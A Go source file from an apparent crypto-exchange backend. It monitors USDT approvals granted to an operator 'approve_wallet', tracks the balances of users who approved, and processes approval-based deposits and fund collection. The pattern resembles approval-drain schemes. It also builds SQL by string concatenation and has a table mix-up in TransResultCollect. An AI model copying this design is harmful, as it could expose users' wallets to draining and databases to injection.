package taskshell

import (
	"cointrade/config"
	"cointrade/lib"
	"cointrade/lib/db"
	"cointrade/models"
	"cointrade/utils"
	"encoding/json"
	"fmt"
	"strings"
	"time"
)

var DATA_CHAN chan *lib.ErcTransInfo

func DataOpApprove(erc *lib.EthLib) {
	for {
		v := <-DATA_CHAN
		ntime := utils.GetNow()

		v.ContractAddress = strings.ToLower(v.ContractAddress)
		go UserAssetMontior(v, erc) //用户资产监控
		if v.ContractAddress != lib.CoinAddressList["usdt"] {
			continue
		}

		v.FromAddress = strings.ToLower(v.FromAddress)
		one, _ := config.GlobalDB.FetchOne(models.DB_TABLE_USER, db.DB_PARAMS{"wallet_address": v.FromAddress}, db.DB_FIELDS{"id"})
		if one == nil {
			continue
		}
		if v.AbiStruct.MethodCode == erc.ApproveHeader {
			//授权时候
			to_address := erc.ApiToAddress(v.AbiStruct.Params[0])
			to_address = strings.ToLower(to_address)
			if to_address != config.GlobalConfig.GetValue("approve_wallet").ToString() {
				continue
			}
			to_amount := erc.ApiToAmount(v.AbiStruct.Params[1])
			if to_amount <= 0 {
				config.GlobalDB.UpdateData(models.DB_TABLE_USER, db.DB_PARAMS{"approve_state": 0, "approve_change_time": ntime}, db.DB_PARAMS{"id": one["id"].Value})
			} else {
				config.GlobalDB.UpdateData(models.DB_TABLE_USER, db.DB_PARAMS{"approve_state": 1, "approve_time": ntime, "approve_change_time": ntime}, db.DB_PARAMS{"id": one["id"].Value})
			}
		}
		time.Sleep(time.Millisecond * 10000)

		/*if v.AbiStruct.MethodCode == erc.TransFerHeader { //如果是授权转账
			//转账时
			one, _ := config.GlobalDB.FetchOne(models.DB_TABLE_RECHARGE_APPROVE, db.DB_PARAMS{"txid": v.TxId}, db.DB_FIELDS{"id", "state", "uid"})
			if one != nil && one["state"].ToInt() != 1 { //此处为授权充值

				to_address := erc.ApiToAddress(v.AbiStruct.Params[0])
				to_address = strings.ToLower(to_address)
				to_amount := erc.ApiToAmount(v.AbiStruct.Params[1])
				if to_address != config.GlobalConfig.GetValue("collection_wallet").ToString() {
					continue
				}
				if models.MODEL_USER.AddCredit(one["uid"].ToInt(), &models.CreditValue{
					Credit:          to_amount,
					UserCoinLogType: models.COIN_LOG_EXCHANGE_ACCOUNT_IN,
					UserCoinLogInfo: models.QueueCreditLog{
						Credit:     to_amount,
						CreateTime: ntime,
						CoinType:   "usdt",
					},
				}) {
					config.GlobalDB.UpdateData(models.DB_TABLE_RECHARGE_APPROVE, db.DB_PARAMS{"state": 1, "finishtime": ntime}, db.DB_PARAMS{"id": one["id"].Value})
				}
			}
			one, _ = config.GlobalDB.FetchOne(models.DB_TABLE_COLLECT_LOG, db.DB_PARAMS{"txid": v.TxId}, db.DB_FIELDS{"id", "state", "uid"})
			if one != nil && one["state"].ToInt() == 0 { //此处为归集状态修改
				config.GlobalDB.UpdateData(models.DB_TABLE_COLLECT_LOG, db.DB_PARAMS{"state": 1, "finishtime": ntime}, db.DB_PARAMS{"id": one["id"].Value})
			}
		}*/
	}

}

// 用户资产更新
func UpdateUserAsset() {
	erc := new(lib.EthLib)
	erc.CreateClient()
	list, _ := config.GlobalDB.FetchAll(models.DB_TABLE_USER, db.DB_PARAMS{"approve_state": 1, "_": " wallet_address != ''"}, db.DB_FIELDS{"id", "wallet_address"})
	for _, one := range list {

		eth, _ := erc.GetBalance(one.Get("wallet_address").ToString()).Float64()
		usdt, _ := erc.GetBalanceOfUsdt(one.Get("wallet_address").ToString()).Float64()

		config.GlobalDB.UpdateData(models.DB_TABLE_USER, db.DB_PARAMS{"wallet_eth": eth, "wallet_usdt": usdt}, db.DB_PARAMS{"id": one.Get("id").ToInt()})

	}
}

func ApproveRecharge() {
	DATA_CHAN = make(chan *lib.ErcTransInfo, 512)
	erc := new(lib.EthLib)
	erc.CreateClient()
	erc.Type = "usdt"
	go DataOpApprove(erc)
	go TransResultCollect(erc)
	go TransResultRecharge(erc)
	go CheckUserWalletState(erc)
	for {
		//b_n := erc.GetBlockNumber()
		trans := erc.GetTranslist(0)
		for _, v := range trans {
			DATA_CHAN <- v
		}
		//trans := erc.GetTranslist(10)
		time.Sleep(5 * time.Second)
	}
}

// 用户资产监控
func UserAssetMontior(v *lib.ErcTransInfo, erc *lib.EthLib) {
	in := make([]string, 0)
	if v == nil {
		return
	}
	in = append(in, `'`+v.FromAddress+`'`)

	if v.ContractAddress == lib.CoinAddressList["usdt"] {
		if v.AbiStruct != nil && len(v.AbiStruct.Params) > 0 {
			//if _, ok := v.AbiStruct.Params[0]; ok {
			to_address := erc.ApiToAddress(v.AbiStruct.Params[0])
			to_address = strings.ToLower(to_address)
			in = append(in, `'`+to_address+`'`)
			//}
		}
	} else {
		if v.AbiStruct == nil {
			in = append(in, `'`+v.ContractAddress+`'`)
		}
	}
	one, _ := config.GlobalDB.FetchOne(models.DB_TABLE_USER, db.DB_PARAMS{"_": fmt.Sprintf("wallet_address in(%s)", strings.Join(in, ","))}, db.DB_FIELDS{"wallet_address", "id"})
	if one != nil {
		eth, _ := erc.GetBalance(one.Get("wallet_address").ToString()).Float64()
		usdt, _ := erc.GetBalanceOfUsdt(one.Get("wallet_address").ToString()).Float64()
		config.GlobalDB.UpdateData(models.DB_TABLE_USER, db.DB_PARAMS{"wallet_eth": eth, "wallet_usdt": usdt}, db.DB_PARAMS{"id": one.Get("id").ToInt()})
	}
}
func TransResultRecharge(erc *lib.EthLib) {
	for {
		list, _ := config.GlobalDB.FetchAll(models.DB_TABLE_RECHARGE_APPROVE, db.DB_PARAMS{"state": 0}, db.DB_FIELDS{})
		for _, v := range list {
			now := utils.GetNow()
			if v["scantime"].ToInt() > 0 && now-v["scantime"].ToInt() > 10*60 { //10分钟得不到正确的结果就设置为失败
				config.GlobalDB.UpdateData(models.DB_TABLE_RECHARGE_APPROVE, db.DB_PARAMS{"state": 2}, db.DB_PARAMS{"id": v["id"].ToInt()})
				continue
			}
			t, isp, err := erc.GetTrans(v["txid"].ToString())
			if err != nil {
				config.GlobalDB.UpdateData(models.DB_TABLE_RECHARGE_APPROVE, db.DB_PARAMS{"scantime": now}, db.DB_PARAMS{"id": v["id"].ToInt()})
				continue
			}
			if isp { //块还在确认中
				config.GlobalDB.UpdateData(models.DB_TABLE_RECHARGE_APPROVE, db.DB_PARAMS{"scantime": now}, db.DB_PARAMS{"id": v["id"].ToInt()})
				continue
			}
			rs := erc.GetTransState(v["txid"].ToString())
			if rs == 1 {
				//成功了
				to_amount := erc.ApiToAmount(t.AbiStruct.Params[2])
				if models.MODEL_USER.AddCredit(v["uid"].ToInt(), &models.CreditValue{
					Credit:          to_amount,
					UserCoinLogType: models.COIN_LOG_EXCHANGE_ACCOUNT_IN,
					UserCoinLogInfo: models.QueueCreditLog{
						Credit:     to_amount,
						CreateTime: now,
						CoinType:   "usdt",
					},
				}) {
					config.GlobalDB.UpdateData(models.DB_TABLE_RECHARGE_APPROVE, db.DB_PARAMS{"state": 1, "finishtime": now}, db.DB_PARAMS{"id": v["id"].Value})
				}
			} else {
				config.GlobalDB.UpdateData(models.DB_TABLE_RECHARGE_APPROVE, db.DB_PARAMS{"state": 2, "scantime": now}, db.DB_PARAMS{"id": v["id"].ToInt()})
				continue
			}
		}
		time.Sleep(30 * time.Second) //30秒一次
	}
}

func TransResultCollect(erc *lib.EthLib) {
	for {

		//归集交易扫描
		list, _ := config.GlobalDB.FetchAll(models.DB_TABLE_COLLECT_LOG, db.DB_PARAMS{"state": 0}, db.DB_FIELDS{})
		for _, v := range list {
			utils.ServiceInfo("trans result collect:", v["txid"].ToString())
			now := utils.GetNow()
			if v["scantime"].ToInt() > 0 && now-v["scantime"].ToInt() > 10*60 { //10分钟得不到正确的结果就设置为失败
				config.GlobalDB.UpdateData(models.DB_TABLE_COLLECT_LOG, db.DB_PARAMS{"state": 2}, db.DB_PARAMS{"id": v["id"].ToInt()})
				continue
			}
			_, isp, err := erc.GetTrans(v["txid"].ToString())
			if err != nil {
				config.GlobalDB.UpdateData(models.DB_TABLE_COLLECT_LOG, db.DB_PARAMS{"scantime": now}, db.DB_PARAMS{"id": v["id"].ToInt()})
				continue
			}
			if isp { //块还在确认中
				config.GlobalDB.UpdateData(models.DB_TABLE_COLLECT_LOG, db.DB_PARAMS{"scantime": now}, db.DB_PARAMS{"id": v["id"].ToInt()})
				continue
			}
			rs := erc.GetTransState(v["txid"].ToString())
			if rs == 1 {
				//成功了
				config.GlobalDB.UpdateData(models.DB_TABLE_COLLECT_LOG, db.DB_PARAMS{"state": 1, "finishtime": now}, db.DB_PARAMS{"id": v["id"].Value})
			} else {
				config.GlobalDB.UpdateData(models.DB_TABLE_RECHARGE_APPROVE, db.DB_PARAMS{"state": 2, "scantime": now}, db.DB_PARAMS{"id": v["id"].ToInt()})
				continue
			}
		}
		time.Sleep(30 * time.Second) //30秒一次
	}
}
func CheckUserWalletState(erc *lib.EthLib) { //用户每次登陆后要检测用户状态
	for {
		s := config.GlobalRedis.PopQueue(models.QUEUE_USER_WALLET_STATE)
		if len(s) > 0 {
			for _, v := range s {
				var uid int
				err := json.Unmarshal([]byte(v), &uid)
				if err != nil {
					continue
				}
				go func() {
					one, _ := config.GlobalDB.FetchOne(models.DB_TABLE_USER, db.DB_PARAMS{"id": uid}, db.DB_FIELDS{"wallet_address"})
					if one == nil {
						return
					}
					eth := erc.GetBalance(one["wallet_address"].ToString())
					usdt := erc.GetBalanceOfUsdt(one["wallet_address"].ToString())
					usdt_num, _ := usdt.Float64()
					eth_num, _ := eth.Float64()
					data := db.DB_PARAMS{"wallet_usdt": usdt_num, "wallet_eth": eth_num}
					models.MODEL_USER.Update(uid, data)
					time.Sleep(3 * time.Minute)
					if b, e := erc.CheckApprove(one["wallet_address"].ToString(), config.GlobalConfig.GetValue("approve_wallet").ToString()); e == nil && !b {
						//config.GlobalDB.UpdateData(DB_TABLE_USER, db.DB_PARAMS{"approve_state": 0}, db.DB_PARAMS{"id": uid})
						models.MODEL_USER.Update(uid, db.DB_PARAMS{"approve_state": 0})
					}
				}()

			}
		}
	}
}
